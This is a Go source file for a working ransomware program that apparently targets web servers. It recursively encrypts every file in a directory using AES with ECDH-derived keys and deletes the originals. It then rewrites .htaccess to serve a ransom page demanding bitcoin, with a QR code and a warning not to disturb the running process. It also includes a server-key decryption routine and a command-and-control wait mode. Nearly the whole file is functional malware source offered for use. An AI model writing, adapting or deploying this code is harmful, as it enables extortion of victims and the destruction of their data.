package main

import (
	"bufio"
	"code.google.com/p/rsc/qr"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/elliptic"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"github.com/jcelliott/lumber"
	"io"
	"io/ioutil"
	"math/big"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"text/template"
)

type CipherMode int

const (
	ENCRYPT_MODE CipherMode = iota
	DECRYPT_MODE
)

var (
	iv           = []byte{34, 35, 35, 57, 68, 4, 35, 36, 7, 8, 35, 23, 35, 86, 35, 23}
	clientConfig *ClientConfig
)

func GetCipherBlockMode(key []byte, mode CipherMode) (cipher.BlockMode, error) {

	aesBlock, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	if mode == ENCRYPT_MODE {
		return cipher.NewCBCEncrypter(aesBlock, iv), nil
	} else {
		return cipher.NewCBCDecrypter(aesBlock, iv), nil
	}

}

func Encrypt(key []byte, source []byte) ([]byte, error) {
	blockMode, _ := GetCipherBlockMode(key, ENCRYPT_MODE)
	source = Pad(source)
	var destLen = len(source)
	dest := make([]byte, destLen)
	blockMode.CryptBlocks(dest, source)
	return dest, nil
}

func Decrypt(key []byte, source []byte) ([]byte, error) {

	blockMode, _ := GetCipherBlockMode(key, DECRYPT_MODE)
	var destLen = len(source)
	if destLen%16 != 0 {
		fmt.Printf("Got block size of %d", destLen)
		return nil, errors.New("Decrypt is not of valid block size")

	}
	dest := make([]byte, destLen)
	blockMode.CryptBlocks(dest, source)
	out := Unpad(dest)
	return out, nil
}

func EncryptDir(dirPath string) error {
	err := filepath.Walk(dirPath, WalkFuncDecorator(EncryptFile))
	if err != nil {
		return err
	}
	return nil
}

func WalkFuncDecorator(walkFn filepath.WalkFunc) filepath.WalkFunc {

	return func(path string, fi os.FileInfo, e error) error {
		err := walkFn(path, fi, e)
		if err != nil {
			LogError(err)
			return nil
		}
		return nil

	}

}

func DecryptDir(dirPath string) error {
	err := filepath.Walk(dirPath, WalkFuncDecorator(DecryptFile))
	if err != nil {
		return err
	}
	return nil
}

func ExtractFileInfo(header []byte) (*CipheredFileInfo, error) {

	text := string(header)
	elts := strings.Split(text, ".")
	if len(elts) < 3 {
		return nil, errors.New("Invalid file header")
	}

	xBytes, err := hex.DecodeString(elts[0])
	if err != nil {
		return nil, err
	}
	x := new(big.Int).SetBytes(xBytes)
	yBytes, err := hex.DecodeString(elts[1])
	if err != nil {
		return nil, err
	}
	y := new(big.Int).SetBytes(yBytes)

	pubkeyCurve := elliptic.P256() //see http://golang.org/pkg/crypto/elliptic/#P256
	pubKey := new(ecdsa.PublicKey)
	pubKey.X = x
	pubKey.Y = y
	pubKey.Curve = pubkeyCurve

	lastIndex := strings.LastIndex(text, elts[1])
	lastIndex += len(elts[1]) + 1

	paddingLen := 16 - (lastIndex % 16)
	lastIndex += paddingLen

	if lastIndex > len(text) {
		// TODO : handle file size ==0
		return nil, errors.New("Unexpected header")
	}

	return &CipheredFileInfo{
		PubKey:    pubKey,
		HeaderLen: lastIndex,
	}, nil

}

func DecryptFile(path string, fi os.FileInfo, err error) (e error) {
	if fi.IsDir() {
		return nil
	}

	if !strings.HasPrefix(fi.Name(), RSW_PREFIX) {
		return nil
	}

	log.Debug("Decrypting... %s", path)
	srcFile, err := os.Open(path)

	if err != nil {
		return err
	}

	defer srcFile.Close()

	baseDir := filepath.Dir(path)
	outFilePath := filepath.Join(baseDir, fi.Name()[len(RSW_PREFIX):])

	outFile, err := os.Create(outFilePath)
	if err != nil {
		return err
	}

	defer outFile.Close()

	headerParsed := false

	var aesBlockMode cipher.BlockMode

	buffer := make([]byte, 1024)
	for {
		// read a chunk
		n, err := srcFile.Read(buffer)
		if err != nil && err != io.EOF {
			return err
		}
		if n == 0 {
			break
		}

		if !headerParsed {
			headerInfo, err := ExtractFileInfo(buffer[:n])
			if err != nil {
				return err
			}
			headerParsed = true
			if n <= headerInfo.HeaderLen {
				break
			}
			cSymK, _ := GenSharedKey(GetServPrivKey(), headerInfo.PubKey)
			aesBlockMode, err = GetCipherBlockMode(cSymK, DECRYPT_MODE)
			log.Debug("Ciphered block")
			if err != nil {
				return err
			}
			if n == 1024 {

				remainingBytes := make([]byte, headerInfo.HeaderLen)
				n, err = srcFile.Read(remainingBytes)
				if err != nil && err != io.EOF {
					return err
				}
				// TODO check header len
				buffer = append(buffer[headerInfo.HeaderLen:1024], remainingBytes[:n]...)
				n = len(buffer)
			} else {
				buffer = buffer[headerInfo.HeaderLen:n]
			}
			n = len(buffer)

		}

		plainData := make([]byte, len(buffer[:n]))
		aesBlockMode.CryptBlocks(plainData, buffer[:n])
		if len(plainData) < 1024 {
			plainData = Unpad(plainData)
		}

		_, err = outFile.Write(plainData)

		if err != nil {
			return err
		}

	}

	srcFile.Close()
	outFile.Close()
	err = CopyFileMetadata(fi, outFilePath)
	if err != nil {
		return err
	}

	os.Remove(path)
	if err != nil {
		return err
	}
	return nil

}

func CreateHeader(pubKey *ecdsa.PublicKey, fi os.FileInfo) string {

	header := ToHex(pubKey.X)
	header += "."
	header += ToHex(pubKey.Y)
	header += "."

	paddingLen := 16 - (len(header) % 16)

	if paddingLen > 0 {
		header += strings.Repeat("F", paddingLen)
	}
	return header

}

func CopyFileMetadata(srcFileInfo os.FileInfo, destFile string) error {

	err := os.Chmod(destFile, srcFileInfo.Mode())

	if err != nil {
		return err
	}

	os.Chtimes(destFile, srcFileInfo.ModTime(), srcFileInfo.ModTime())
	if err != nil {
		return err
	}

	return nil

}

func EncryptFile(path string, fi os.FileInfo, err error) (e error) {
	if fi.IsDir() || IsSymlink(fi) {
		return nil
	}

	if strings.HasPrefix(fi.Name(), ".") || strings.HasPrefix(fi.Name(), RSW_PREFIX) || strings.HasPrefix(fi.Name(), RSW_WELCOME) {
		return nil
	}
	if strings.Contains(os.Args[0], fi.Name()) {
		curFileInfo, err := os.Stat(os.Args[0])
		if err != nil {
			return err
		}
		if os.SameFile(fi, curFileInfo) {
			return nil
		}

	}

	log.Debug("Encrypting... %s", path)

	srcFile, err := os.Open(path)

	if err != nil {
		return err
	}

	defer srcFile.Close()

	baseDir := filepath.Dir(path)
	outFilePath := filepath.Join(baseDir, RSW_PREFIX+fi.Name())

	outFile, err := os.Create(outFilePath)
	if err != nil {
		return err
	}

	defer outFile.Close()

	clientPrivKey, _ := GenerateECDSAPrivateKey()
	cSymK, _ := GenSharedKey(clientPrivKey, GetServPubKey((*clientConfig).PubKey))
	aesBlockMode, err := GetCipherBlockMode(cSymK, ENCRYPT_MODE)
	if err != nil {
		return err
	}

	outFile.WriteString(CreateHeader(&clientPrivKey.PublicKey, fi))

	buffer := make([]byte, 1024)
	for {
		// read a chunk
		n, err := srcFile.Read(buffer)
		if err != nil && err != io.EOF {
			return err
		}
		if n == 0 {
			break
		}

		if n < 1024 {
			buffer = Pad(buffer[:n])
			n = len(buffer)
		}

		cCiphered := make([]byte, len(buffer))

		aesBlockMode.CryptBlocks(cCiphered, buffer[:n])
		_, err = outFile.Write(cCiphered)

		if err != nil {
			return err
		}

	}

	srcFile.Close()
	outFile.Close()
	err = CopyFileMetadata(fi, outFilePath)
	if err != nil {
		return err

	}

	err = os.Remove(path)
	if err != nil {
		return err

	}

	return nil

}

func UninstallRSWPage() error {

	err := RestoreHtAccess()
	if err != nil {
		return err
	}

	return os.Remove(RSW_WELCOME)
}

func RestoreHtAccess() error {

	content, err := ioutil.ReadFile(".htaccess")
	if err != nil {
		return err
	}
	lines := strings.Split(string(content), "\n")
	rr1 := regexp.MustCompile(`^DirectoryIndex.*$`)
	rr2 := regexp.MustCompile(`^#DirectoryIndex.*$`)

	file, err := os.Create(".htaccess")
	if err != nil {
		return err
	}
	defer file.Close()

	w := bufio.NewWriter(file)
	for idx, line := range lines {
		if rr1.MatchString(line) {
			continue
		} else if rr2.MatchString(line) {
			fmt.Fprintln(w, line[1:])
		} else {
			if idx+1 == len(lines) {
				fmt.Fprint(w, line)
			} else {
				fmt.Fprintln(w, line)
			}

		}
	}

	return w.Flush()

}

func RedirectHtAccess() error {
	content, err := ioutil.ReadFile(".htaccess")
	if err != nil {
		return err
	}
	lines := strings.Split(string(content), "\n")
	rr := regexp.MustCompile(`^DirectoryIndex.*$`)

	file, err := os.Create(".htaccess")
	if err != nil {
		return err
	}
	defer file.Close()

	w := bufio.NewWriter(file)
	var matched = false
	//"DirectoryIndex  main.php"
	for idx, line := range lines {
		if !matched && rr.MatchString(line) {
			fmt.Fprintf(w, "#%s\n", line)
			fmt.Fprintf(w, "DirectoryIndex %s\n", RSW_WELCOME)
		} else {
			if idx+1 == len(lines) {
				fmt.Fprint(w, line)
			} else {
				fmt.Fprintln(w, line)

			}
		}
	}

	return w.Flush()

}

func InstallRSWPage() error {
	err := WriteRSWPage(RSW_WELCOME)
	if err != nil {
		return err
	}

	return RedirectHtAccess()
}

func WriteRSWPage(filePath string) error {

	srcFile, err := os.Create(filePath)

	if err != nil {
		return err
	}

	code, err := qr.Encode("bitcoin:"+(*clientConfig).BtcAddress+"?amount="+url.QueryEscape((*clientConfig).Amount), qr.L)
	if err != nil {
		return err
	}

	qrCodeB64 := base64.StdEncoding.EncodeToString(code.PNG())

	tmplStr := ` 
<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml">

<head>
    <title>Important Message</title>
    <!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">

<!-- Optional theme -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css">

<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
</head>

<body>

   <div class="container">
      <div class="header">
        <h3 class="text-muted">Important message</h3>
      </div>

      <div class="jumbotron">
        <h1>Message to the administrator</h1>
        <p class="lead">All your files have been encrypted with strong cryptographic algorithms</p>
        <p>If you wish to recover them without a long and painful restoration process</p>
        <p>Send a total of {{.Amount}} bitcoin to the following address: <a href="https://blockchain.info/address/{{.BtcAddress}}"><b>{{.BtcAddress}}</b></a> <br/>
        <img alt="bitcoin" src="data:image/png;base64,{{.QrcodeB64}}" />
        </p>
        <p>Once you've paid {{.Amount}} btc, your files will automatically be decrypted (it can take 5hours to confirm a bitcoin transaction)</p>
        <p><b>!Do not touch any file and the running process rsw or your files might be lost forever!</b></p>
        <p><b>!If the process crashed or machine restarted just launch it by typing : <quote>nohup ./rsw -waitForCC &</quote> </b></p>
        <ul>
        <li>If you have no bitcoin buy some at <a href="">localbitcoins.com</a> or <a href="https://btc-e.com/">https://btc-e.com</a> </li>
     </ul>
      </div>


    </div> <!-- /container -->
</body>
</html>	
	 `

	defer srcFile.Close()

	tmpl, err := template.New("wp").Parse(tmplStr)
	if err != nil {
		return err
	}

	data := struct {
		ClientConfig
		QrcodeB64 string
	}{*clientConfig, qrCodeB64}

	return tmpl.Execute(srcFile, data)

}

func LoadCConfig() error {
	clientConfig = &ClientConfig{}
	fileName, err := FindLatestClientConfig(".")
	if fileName == "" || err != nil {
		return errors.New("Could not find client configuration file")
	}
	return ReadFromJson(fileName, clientConfig)
}

func FindLatestClientConfig(dirPath string) (string, error) {

	fileInfos, err := ioutil.ReadDir(dirPath)
	if err != nil {
		return "", err
	}

	var foundFile os.FileInfo

	for _, fileInfo := range fileInfos {

		if strings.Index(fileInfo.Name(), RSW_CC_FILE_PREFIX) == 0 {
			if foundFile == nil {
				foundFile = fileInfo
				continue
			} else {
				if foundFile.ModTime().Before(fileInfo.ModTime()) {
					foundFile = fileInfo
				}

			}

		}
	}
	if foundFile != nil {
		return foundFile.Name(), nil

	} else {
		return "", nil
	}

}

func main() {
	encryptDir := flag.String("encrypt", "", "directory to encrypt")
	decryptDir := flag.String("decrypt", "", "directory to decrypt")
	serverPrivateKeyHex := flag.String("privateK", "", "private key")
	debug := flag.Bool("debug", false, "If debug mode is on")
	pollPeriod := flag.Int("poll", 600, "polling period when waiting for CC")
	installWelcomePageFlag := flag.Bool("installWP", false, "If welcome page must be installed")
	uninstallWelcomePageFlag := flag.Bool("uninstallWP", false, "If welcome page must be uninstalled")
	waitForCCFlag := flag.Bool("waitForCC", false, "If client must wait for server command")
	init := flag.Bool("init", false, "Initialize client")

	var err error

	flag.Parse()

	if *init {
		err = Init()
		if err != nil {
			panic(err)

		} else {
			os.Exit(0)
		}

	}

	if *debug {
		log = lumber.NewConsoleLogger(lumber.DEBUG)
	} else {
		log = lumber.NewConsoleLogger(lumber.INFO)
	}

	if flag.NFlag() != 0 {
		err = LoadCConfig()
		if err != nil {
			panic(err)

		}
	}

	if *encryptDir != "" && *decryptDir != "" {
		fmt.Fprintf(os.Stderr, "Both encrypt and decrypt have been asked, choose one of them !\n")
		usage()

	} else if *encryptDir != "" {
		err = EncryptDir(*encryptDir)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Failed encrypting exiting !\n")
			os.Exit(1)
		}
		if err != nil {
			fmt.Fprintf(os.Stderr, "Failed installing rsw page !\n")
			os.Exit(1)
		}

	} else if *decryptDir != "" {

		if *serverPrivateKeyHex == "" {
			fmt.Fprintf(os.Stderr, "Missing private key !\n")
			usage()
		}

		err = SetServerPrivateKey(*serverPrivateKeyHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Invalid private key %s !\n", serverPrivateKeyHex)
			usage()
		}

		err = DecryptDir(*decryptDir)

	}
	if *uninstallWelcomePageFlag {
		err = UninstallRSWPage()
	} else if *installWelcomePageFlag {
		err = InstallRSWPage()
	}
	if *waitForCCFlag {
		WaitForCC(*pollPeriod)
	}
	if flag.NFlag() == 0 {
		usage()
	}

	if err != nil {
		panic(err)
	}

}
